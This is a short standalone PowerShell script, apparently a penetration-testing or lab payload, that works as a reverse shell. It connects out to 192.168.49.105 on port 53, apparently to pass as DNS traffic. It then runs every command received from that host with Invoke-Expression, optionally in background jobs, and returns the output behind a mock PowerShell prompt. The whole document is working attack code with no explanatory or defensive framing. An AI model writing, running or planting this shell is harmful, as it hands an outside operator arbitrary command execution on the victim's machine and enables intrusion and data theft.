$c = New-Object Net.Sockets.TcpClient('192.168.49.105', 53)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i)
if ($d.StartsWith("sync ")){
$d = $d -replace "sync "
$j = Start-Job -ScriptBlock { try { iex $using:d } catch { echo ($Error[0] | Out-String) } }
while ($j.State -ne "Completed"){
$s1 = (Receive-Job $j | Out-String)
if ($s1 -ne ""){
$s2 = ([text.encoding]::ASCII).GetBytes($s1)
$s.Write($s2,0,$s2.Length)
$s.Flush()}}
$s1 = 'PS ' + (pwd).Path + '> '
$s2 = ([text.encoding]::ASCII).GetBytes($s1)
$s.Write($s2,0,$s2.Length)
$s.Flush()} else {
$s1 = ""
try { $s1 += (iex $d | Out-String) } catch { $s1 += ($Error[0] | Out-String) }
$s2 = $s1 + 'PS ' + (pwd).Path + '> '
$s3 = ([text.encoding]::ASCII).GetBytes($s2)
$s.Write($s3,0,$s3.Length)
$s.Flush()
}}
$c.Close()
